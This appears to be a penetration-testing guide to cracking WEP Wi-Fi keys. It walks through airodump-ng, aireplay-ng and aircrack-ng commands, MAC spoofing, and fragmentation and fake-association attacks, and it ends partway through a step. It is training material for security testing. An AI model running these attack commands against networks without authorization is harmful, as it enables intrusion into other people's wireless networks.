# Wired Equivalent Privacy \(WEP\) Attacks

The security issues with WEP stem from US export restrictions on cryptographic technologies in the '90s, which dictated that encryption keys could be no longer than 64-bits. Of this 64-bits the original WEP standard uses 24 bits for the Initialisation Vector \(IV\) leaving 40-bits for the key itself.Once the restrictions were lifted, the total key length was lengthened to 128-bits, but the protocol still used a 24-bit IV. For more information about the WEP algorithm itself, see [Appendix A.](/appendices/appendix-a-wireless-network-encryption-protocols.md)

### Cracking WEP with Connected Clients

A WEP encrypted AP with connected clients will natively have traffic which can be sniffed to acquire the information needed to crack the WEP key. One method for achieving this is as follows:

1. Gather information about the target AP using `airodump-ng` \(alternatively, use `kismet`\). This includes: SSID, BSSID, channel and the MAC address of an associated client.
   1. `airodump-ng wlan0mon`
2. Set a wireless network interface to monitoring mode so traffic can be sniffed.
   1. `airmon-ng start wlan0 <channel>`
3. Begin sniffing traffic using airodump-ng and write the findings fo file. \(Use the findings of 2 as parameters\)
`airodump-ng --ivs --channel <channel> --bssid <AP-BSSID> --write <filename> wlan0mon`

4. Rather than waiting for the client to sens packets to the AP, craft packets with `aireplay-ng` posing as the client. Capture at least 50,000 packets before proceeding.

   1. `aireplay-ng -3 -h <client-MAC> -b <AP BSSID> wlan0mon`

5. Run the output file through aircrack-ng to retrieve the WEP key.

   1. `aircrack-ng <filename>`

6. Verify the key is correct by authenticating with the AP using the key.

   1. Spoof the client's MAC.

      1. `ifconfig wlan0 down`

      2. `ifconfig wlan0 hw ether <client-MAC>`

      3. `ifconfig wlan0 up`

   2. Attempt to associate with the AP.

      1. `iwconfig wlan0 essid <ESSID> key <key>`

      2. `iwconfig channel auto`

   3. verify that you are connected.

      1. `iwconfig wlan0`

### Cracking WEP with no Connected Clients

Rather than attempting to retrieve the WEP key itself, attacks on WEP APs with no connected clients intend to obtain the Pseudo Random Generation Algorithm \(PRGA\) file from the AP. This file can be used to create new packets that can be used for injection.

1. Gather information about the target AP using `airodump-ng` \(alternatively, use `kismet`\). This includes: SSID, BSSID, channel and the MAC address of an associated client.
   1. `airodump-ng wlan0mon`
2. Set a wireless network interface to monitoring mode so traffic can be sniffed.
   1. `airmon-ng start wlan0mon`
3. Begin sniffing traffic using airodump-ng and write the findings fo file. \(Use the findings of 2 as parameters\)
   1. `a      irodump-ng --channel <channel> --bssid <AP-BSSID> --write <filename> wlan0mon`
4. Gather the PRGA using either the Fragmentation attack or KoreKchopchop attack. Thry the attacks in that order, and if neither are successful, wait until a client has associated and perform the "cracking WEP with Connected Client" attack outlined above.
1. Fragmentation attack
   1. In a separate shell, start a fragmentation attack
      1. `aireplay-ng -5 -b <BSSID> -h <your-MAC> wlan0mon`
   2. In a separate shell, fake an association request to the AP
      1. `aireplay-ng -1 0 -o 1 -e <ESSID> -h <your-MAC> -a <BSSID> wlan0mon`

   
   